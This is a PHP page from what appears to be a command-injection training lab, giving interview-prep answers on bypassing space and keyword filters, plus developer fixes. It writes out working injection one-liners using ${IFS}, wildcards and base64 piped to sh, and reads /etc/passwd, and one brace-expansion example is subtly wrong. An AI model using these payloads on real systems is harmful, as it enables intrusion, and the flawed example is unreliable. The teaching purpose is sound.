<?php
require_once __DIR__ . '/includes/helpers.php';
$lab_id = 'c5';
$page_title = 'Interview Prep — IFS & Wildcard Bypass';
include __DIR__ . '/includes/header.php';
?>
<div class="interview-page">
  <a href="/cmd_c5.php" class="btn btn-ghost btn-sm" style="margin-bottom:24px;">&larr; Back to Lab C5</a>
  <h1>Lab C5 — IFS & Wildcard Bypass</h1>
  <p class="subtitle">Interview prep: bypassing space and keyword filters using shell internals.</p>

  <div class="interview-section">
    <h2>30-Second Answer</h2>
    <div class="thirty-sec">
      "When a filter blocks spaces and specific command names, shell internal field separator substitution and glob wildcards let you reconstruct blocked commands. <code>${IFS}</code> replaces whitespace; <code>/???/c?t</code> globs to <code>/usr/cat</code> or similar without spelling the word."
    </div>
  </div>

  <div class="interview-section">
    <h2>Common Interview Questions</h2>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q1">
      <label class="qa-question" for="q1">How do you run commands when spaces are filtered?</label>
      <div class="qa-answer">
        Use <code>${IFS}</code> — the shell Internal Field Separator, which defaults to space/tab/newline. The shell expands it before executing, so the filter never sees a literal space.<br><br>
        Other techniques: <code>$IFS$9</code> (concatenated to avoid word splitting issues), brace expansion <code>{cat,/etc/passwd}</code>, and tab characters (<code>$'\t'</code>).
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q2">
      <label class="qa-question" for="q2">How do wildcards help bypass keyword filters?</label>
      <div class="qa-answer">
        Shell wildcards <code>?</code> (one char) and <code>*</code> (any string) are expanded by the shell before the command runs. So <code>/???/c?t</code> matches <code>/usr/cat</code>, <code>/bin/cat</code> etc. without ever typing "cat".<br><br>
        Brace expansion also works: <code>{c,}at</code> → <code>cat</code>, or character classes in some shells: <code>[c]at</code>.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q3">
      <label class="qa-question" for="q3">What is base64 staging and when do you use it?</label>
      <div class="qa-answer">
        When both spaces and the target command name are blocked, you can base64-encode the full payload, then decode and execute at runtime:<br><br>
        <code>echo${IFS}Y2F0IC9mbGFncy9sYWJfYzUudHh0|base64${IFS}-d|sh</code><br><br>
        The filter never sees "cat" or "/flags" — only base64 characters pass through. Useful against strict keyword blacklists.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q4">
      <label class="qa-question" for="q4">Why do keyword blacklists ultimately fail?</label>
      <div class="qa-answer">
        Blacklists try to enumerate every dangerous character or word — an impossible task. For every blocked term, there are multiple bypass paths: encoding, wildcards, variable expansion, alternative commands (<code>more</code>, <code>less</code>, <code>tac</code> instead of <code>cat</code>), redirections, and language-level tricks. The only reliable fix is an allowlist.
      </div>
    </div>
  </div>

  <div class="interview-section">
    <h2>Bypass One-Liners</h2>
    <div class="oneliner">127.0.0.1;/???/c?t${IFS}/????/lab_c5.txt</div>
    <div class="oneliner">127.0.0.1;/bin/c'a't${IFS}/flags/lab_c5.txt</div>
    <div class="oneliner">127.0.0.1;$(echo${IFS}Y2F0IC9mbGFncy9sYWJfYzUudHh0|base64${IFS}-d)</div>
    <div class="oneliner">127.0.0.1;{c,at}${IFS}/flags/lab_c5.txt</div>
  </div>

  <div class="interview-section">
    <h2>Developer Fix</h2>
    <p>
      <strong>Never use blacklists for command injection prevention.</strong> The correct fix is:
    </p>
    <ul>
      <li>Avoid shelling out entirely — use language-native libraries (e.g. PHP's <code>socket_create</code> instead of ping).</li>
      <li>If a shell command is unavoidable, use <code>escapeshellarg()</code> on each argument and pass arguments as an array to <code>proc_open()</code> rather than concatenating into a string.</li>
      <li>Allowlist the input: for a hostname, only allow <code>[a-zA-Z0-9.\-]</code>.</li>
    </ul>
  </div>

  <div class="interview-section">
    <h2>Red Flags</h2>
    <div class="red-flag-item">⚠ "We block semicolons, pipes, and the dollar sign — that covers it." Wildcards, ${IFS}, base64, and dozens of other techniques remain.</div>
    <div class="red-flag-item">⚠ Thinking case-sensitivity helps: <code>str_ireplace</code> blocks both <code>cat</code> and <code>CAT</code> but still misses <code>c'a't</code> or <code>/???/c?t</code>.</div>
    <div class="red-flag-item">⚠ Using <code>escapeshellcmd()</code> instead of <code>escapeshellarg()</code> — the former is weaker and well-known to be bypassable in many scenarios.</div>
  </div>

  <div style="padding-top:24px;border-top:1px solid var(--border);display:flex;gap:12px;">
    <a href="/cmd_c5.php" class="btn btn-ghost btn-sm">&larr; Back to Lab</a>
    <a href="/index.php" class="btn btn-ghost btn-sm">Hub</a>
  </div>
</div>
<?php include __DIR__ . '/includes/footer.php'; ?>
